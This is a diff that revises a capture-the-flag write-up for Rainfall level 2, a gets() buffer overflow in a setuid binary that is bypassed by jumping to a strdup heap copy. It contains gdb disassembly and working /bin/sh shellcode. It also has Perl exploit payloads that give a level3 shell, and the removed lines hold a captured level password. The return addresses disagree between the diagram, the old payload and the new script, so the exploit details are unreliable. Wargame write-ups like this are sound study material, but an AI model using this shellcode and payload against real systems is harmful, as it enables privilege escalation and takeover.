@@ -1,21 +1,109 @@
-Here we have a binary "level2"
+LEVEL 2
 
-If we decompile it, we see a small main who is calling "p" function.
-<+6>:	call   0x80484d4 <p>
+When logging as level2 in Rainfall we have a home with an executable called
+level2 :
+
+-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
+
+We can execute it :
+
+level2@RainFall:~$ ./level2
+something
+something
+level2@RainFall:~$
+
+It waits for an input from stdin and print it.
+
+Let's try with more arguments :
+
+level2@RainFall:~$ ./level2 "hi" "hello" "123456789"
+boop
+boop
+level2@RainFall:~$
+
+Nothing is changing, level2 is still waiting for stdin
+We can try to send a file as parameter :
+
+level2@RainFall:~$ echo "hello there" > /tmp/hello
+level2@RainFall:~$ ./level2 < /tmp/hello
+hello there
+level2@RainFall:~$
+
+And it worked.
+Using the executable itself as parameter makes it crash :
+
+level2@RainFall:~$ ./level2 < ~/level2
+ELF
+Segmentation fault (core dumped)
+level2@RainFall:~$
 
 Ok like previous exercise we have a call to gets function.
 We know gets have a vulnerability to overflow.
+
 <+25>:	call   0x80483c0 <gets@plt>
 
-But the program have a security and he check the return address to gets
+Let's open gdb to get more information :
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804853f <+0>:	push   %ebp
+   0x08048540 <+1>:	mov    %esp,%ebp
+   0x08048542 <+3>:	and    $0xfffffff0,%esp
+   0x08048545 <+6>:	call   0x80484d4 <p>
+   0x0804854a <+11>:	leave
+   0x0804854b <+12>:	ret
+End of assembler dump.
+
+Before exiting, in the main there is a call to a function 'p'
+
+(gdb) disas p
+Dump of assembler code for function p:
+   0x080484d4 <+0>:	push   %ebp
+   0x080484d5 <+1>:	mov    %esp,%ebp
+   0x080484d7 <+3>:	sub    $0x68,%esp
+   0x080484da <+6>:	mov    0x8049860,%eax
+   0x080484df <+11>:	mov    %eax,(%esp)
+   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax:W
+
+   0x080484ea <+22>:	mov    %eax,(%esp)
+   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
+   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
+   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
+   0x080484fb <+39>:	and    $0xb0000000,%eax
+   0x08048500 <+44>:	cmp    $0xb0000000,%eax
+   0x08048505 <+49>:	jne    0x8048527 <p+83>
+   0x08048507 <+51>:	mov    $0x8048620,%eax
+   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
+   0x0804850f <+59>:	mov    %edx,0x4(%esp)
+   0x08048513 <+63>:	mov    %eax,(%esp)
+   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
+   0x0804851b <+71>:	movl   $0x1,(%esp)
+   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
+   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
+   0x0804852a <+86>:	mov    %eax,(%esp)
+   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
+   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
+   0x08048535 <+97>:	mov    %eax,(%esp)
+   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:	leave
+   0x0804853e <+106>:	ret
+End of assembler dump.
+
+The program has a security and checks the return address to gets
 if is start to 0xb*******.
 <+39>:	and    $0xb0000000,%eax
 <+44>:	cmp    $0xb0000000,%eax
 
-So we can't make a same overflow of exercise 1.
-But p function return adress of strdup with string of gets get.
+The goal of the exploit is to change the return address and redirect it to malicious code.
+But how ? Since there is a protection to check the return address.
+If we do something in the stack the return address will pass the condition and exit. We of course
+want to avoid that.
 
-So we can check this, I put breackpoint at return of main funtion.
+In our case we will exploit the strdup which calls malloc.
+
+So we can check this, by putting a breakpoint at return of main funtion.
 
 (gdb) b * main + 12
 Breakpoint 1 at 0x804854b
@@ -40,26 +128,31 @@ Program received signal SIGSEGV, Segmentation fault.
 0x37634136 = 37 63 41 36 = (in ascii) 7 c A 6, is in little Endian so if i reverse this 6Ac7
 In my long string '6Ac7' Start at the 80th character
 
-Now I need a shellcode for run a shell, I take this:
-http://shell-storm.org/shellcode/files/shellcode-219.php
+ Buffer start
+      | ---------- Shellcode (n bytes) --------- |
+      | -------- Padding (80 - n bytes) -------- |
+      | -- Return address 0x80484cf (4 bytes) -- |
+Buffer end (84 bytes total)
 
-\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+We can write then an exploit :
 
-And the return adress of strdup, we display it higher
-(gdb) x/s $eax
-0x804a008:   "Hello World!"
+$NOP = "\x90";
+$SHELLCODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31
+\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50
+\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+$XC = "\xCC"x(80-55-4) ."\xeb\x85\x04\x08";
 
-With perl it's look like this:
+print $NOP x 4 . $SHELLCODE . $XC;
 
-perl -e 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" . "A"x(80-55)  . "\x08\xa0\x04\x08");' | ./level2
+And execute it : 
 
-
-
-
-level2@RainFall:~$ perl -e 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" . "A"x(80-55)  . "\x08\xa0\x04\x08");' | ./level2
-1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
-                                           ̀AAAAAAAAAAAAAAAAAAA�
+level2@RainFall:~$ perl /tmp/exploit.pl | ./level2
+����1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
+                                               ̀������������������
+$ echo hi
+hi
 $ whoami
 level3
-$ cat /home/user/level3/.pass
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+$
+
+
